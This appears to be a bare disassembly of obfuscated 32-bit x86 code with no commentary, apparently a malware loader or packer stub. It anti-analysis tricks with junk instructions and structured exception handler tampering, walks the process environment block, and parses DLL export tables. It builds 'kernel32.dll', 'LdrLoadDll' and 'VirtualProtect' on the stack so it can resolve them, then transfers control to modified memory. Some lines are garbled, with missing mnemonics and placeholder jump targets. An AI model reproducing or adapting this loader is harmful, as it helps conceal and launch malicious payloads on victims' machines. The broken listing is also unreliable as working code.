_start
pushad
sub esp 0x4
mov [ esp ] ebx
xor ebx [ esp ]
or esi esi
sbb esp 0xfffffffc
push esp
and eax eax
sbb ebx 0xffffffff
add esp 0x4
mov esi [ esp - 0x4 ]
sub ebx 0xffffffff
and eax eax
sbb esi 0x4
sub ebx 0xffffffff
neg ebx
call $+5
sub [ esi ] ebx
retn
sub_6f00203d
sub esp 0x4
mov [ esp ] edx
xor edx [ esp ]
or ebx ebx
sbb esp 0xfffffffc
push edx
pop eax
stc
sbb al 0x0
dec ax
mov ah al
mov ecx 0x0
add ecx edx
call $+5
sub esi esi
add esi [ esp ]
and ebx ebx
adc ecx 0x1
movzx ebx [ esi + ecx - 0x2 ]
push ebx
sub ebx eax
pop ebx
jne r-xdata
add [ esp ] edx
jmp [ esp ]
mov edx 0x0
or edx ecx
sub_6f0020c2
push [ fs : 0x0 ]
add edx esi
and eax 0x0
or eax 0xffff
not ecx
test edi edi
adc edx esi
mov [ fs : 0x0 ] esp
and edx ecx
and eax eax
adc edx esi
or ecx ecx
jae r-xdata
call $+5
call sub_6f0020c2
call $+5
mov [ esp ] ecx
mov ecx [ esp + 0x10 ]
sub [ ecx + 0xb8 ] 0xffffffff
test edi edi
adc [ ecx + 0xb8 ] 0x1
add esp 0x4
mov ecx [ esp - 0x4 ]
call $+5
mov [ esp ] eax
xor eax [ esp ]
test eax eax
sbb esp 0xfffffffc
retn 0x10
pop ebx
mov ebx 0x0
or ebx [ esp ]
mov [ fs : 0x0 ] ebx
and ebx ebx
adc esp 0x8
sub esi esi
add esi edx
mov ebx [ edx + 0x3c ]
and edx edx
adc edx ebx
mov ebx 0x0
add ebx 0x4550
and edi 0x0
add edi [ edx ]
sub esp 0x4
mov [ esp ] edi
test ebx ebx
sbb edi ebx
pop edi
jne r-xdata
jmp [ esp ]
popad
mov eax 0x0
xor eax 0x1
retn 0xc
and ebx 0x0
add ebx [ edx + 0x78 ]
xor edx edx
xor edx ebx
add edx esi
sub esp 0x4
mov [ esp ] edx
xor ebx ebx
xor ebx [ edx + 0x20 ]
mov edx 0x0
add edx ebx
test edx edx
adc edx esi
sub esp 0x4
mov [ esp ] esi
call $+5
mov [ esp ] edx
add esp 0x4
mov esi [ esp - 0x4 ]
add esp 0x4
mov ebx [ esp - 0x4 ]
call $+5
mov [ esp ] edx
xor edx [ esp ]
and esi esi
sbb esp 0xfffffffc
and eax 0x0
add eax esi
mov ecx 0x0
xor ecx [ esi ]
and esi 0x0
add esi ecx
call $+5
and ebp 0x0
or ebp esp
add esi ebx
add esp 0xfffffffc
mov [ esp ] 0x6c6c
call $+5
mov [ esp ] 0x4464616f
sub esp 0x4
mov [ esp ] 0x4c72644c
mov edi 0x0
add edi esp
xor ecx ecx
add ecx 0xb
[ esi ] [ edi ]
je r-xdata
sub edx esi
xor ebx ebx
mov ebx [ edx ]
xor edi edi
xor edi 0x5a4d
and ebx eax
call $+5
mov [ esp ] edi
xor edi ebx
pop edi
je r-xdata
push ebp
pop esp
mov esi [ esp ]
add esp 0x4
add esp 0xfffffffc
mov [ esp ] ebx
push edx
pop ecx
add esp 0x4
mov esi [ esp - 0x4 ]
mov edx [ esp ]
add esp 0x4
mov eax 0x0
or eax edx
mov ebx 0x0
add ebx [ edx + 0x24 ]
xor edx edx
or edx ebx
add edx esi
xor ebx ebx
add ebx [ edx + ecx * 2 ]
and ebx 0xffff
test ebx ebx
mov ecx 0x0
adc ecx ebx
push [ eax + 0x10 ]
pop ebx
sub ecx ebx
inc ecx
xor edx edx
xor edx [ eax + 0x1c ]
add edx esi
xor ebx ebx
add ebx [ edx + ecx * 4 ]
or esi esi
adc esi ebx
mov ebp 0x0
xor ebp esp
sub esp 0x4
mov [ esp ] ebx
xor ebx [ esp ]
and ebx ebx
sbb esp 0xfffffffc
push ebx
xor edx edx
xor edx esp
push ebx
call $+5
mov [ esp ] 0x6c006c
add esp 0xfffffffc
mov [ esp ] 0x64002e
sub esp 0x4
mov [ esp ] 0x320033
add esp 0xfffffffc
mov [ esp ] 0x6c0065
call $+5
mov [ esp ] 0x6e0072
add esp 0xfffffffc
mov [ esp ] 0x65006b
push esp
call $+5
mov [ esp ] 0x1a0018
xor edi edi
add edi esp
add esp 0xfffffffc
mov [ esp ] edx
call $+5
mov [ esp ] edi
add esp 0xfffffffc
mov [ esp ] ebx
add esp 0xfffffffc
mov [ esp ] ebx
add esp 0xfffffffc
mov [ esp ] esi
sub esp 0x4
mov [ esp ] edx
add esp 0x4
mov esi [ esp - 0x4 ]
mov ebx [ esp ]
add esp 0x4
call ebx
and eax 0x0
or eax [ esi ]
push eax
add esp 0x4
mov ebx [ esp - 0x4 ]
sub edi edi
add edi [ fs : 0x30 ]
sub esi esi
add esi [ edi + 0x10 ]
mov [ esi + 0x18 ] ebx
sub esp esp
add esp ebp
xor edi edi
xor edi [ fs : 0x30 ]
and esi 0x0
add esi [ edi + 0x10 ]
sub edx edx
add edx [ esi + 0x18 ]
mov esi 0x0
sub esi edx
neg esi
sub ebx ebx
add ebx [ edx + 0x3c ]
test esi esi
adc edx ebx
push [ edx + 0x78 ]
pop ebx
and ecx ecx
mov edx 0x0
adc edx ebx
add edx esi
push edx
mov ebx 0x0
sub ebx [ edx + 0x20 ]
neg ebx
push ebx
pop edx
add edx esi
push esi
add esp 0xfffffffc
mov [ esp ] edx
add esp 0x4
mov esi [ esp - 0x4 ]
add esp 0x4
mov ebx [ esp - 0x4 ]
sub esp 0x4
mov [ esp ] edx
xor edx [ esp ]
add esp 0x4
xor eax eax
add eax esi
push [ esi ]
pop ecx
and esi 0x0
add esi ecx
call $+5
xor ebp ebp
xor ebp esp
add esi ebx
call $+5
mov [ esp ] 0x7463
call $+5
mov [ esp ] 0x65746f72
sub esp 0x4
mov [ esp ] 0x506c6175
add esp 0xfffffffc
mov [ esp ] 0x74726956
or ebx ebx
mov edi 0x0
adc edi esp
push 0xf
pop ecx
[ esi ] [ edi ]
je r-xdata
and eax eax
sbb edx 0xffffffff
and esi esi
adc eax 0x4
sub esi esi
add esi [ eax ]
xor esp esp
or esp ebp
jmp [ esp ]
mov esp ebp
mov esi [ esp ]
add esp 0x4
call $+5
mov [ esp ] ebx
sub esp 0x4
mov [ esp ] edx
add esp 0x4
mov ecx [ esp - 0x4 ]
pop esi
add esp 0x4
mov edx [ esp - 0x4 ]
mov eax 0x0
add eax edx
test edi edi
mov ebx 0x0
adc ebx [ edx + 0x24 ]
mov edx 0x0
add edx ebx
and ebx ebx
adc edx esi
mov ebx 0x0
or ebx [ edx + ecx * 2 ]
and ebx 0xffff
mov ecx ebx
push [ eax + 0x10 ]
pop ebx
sub ecx ebx
test ebx ebx
adc ecx 0x1
mov edx [ eax + 0x1c ]
add edx esi
mov ebx 0x0
sub ebx [ edx + ecx * 4 ]
neg ebx
add esi ebx
xor eax eax
add eax 0x1000
call $+5
mov edx [ esp ]
add esp 0x4
and edx 0xfffff000
or ebx ebx
adc edx eax
and ebx ebx
adc edx eax
push edx
xor edi edi
or edi 0x4
call $+5
add edx eax
mov ebx 0x0
or ebx [ edx ]
sub edi 0x1
je r-xdata
inc edx
test edx edx
adc eax 0x4
and esi 0x0
or esi [ eax ]
mov esp 0x0
xor esp ebp
jmp [ esp ]
add esp 0x4
mov ebx [ esp - 0x4 ]
add esp 0x4
mov edx [ esp - 0x4 ]
sub esp 0x4
mov [ esp ] ebx
push esp
sub esp 0x4
mov [ esp ] 0x40
push 0x45de
add esp 0xfffffffc
mov [ esp ] edx
add esp 0xfffffffc
mov [ esp ] esi
add esp 0xfffffffc
mov [ esp ] edx
mov esi [ esp ]
add esp 0x4
mov ebx [ esp ]
add esp 0x4
call $+5
pop eax
and eax eax
adc eax 0x19
push eax
add esp 0xfffffffc
mov [ esp ] ebp
mov ebp 0x0
xor ebp esp
add ebx 0x5
jmp ebx
jmp [ esp ]
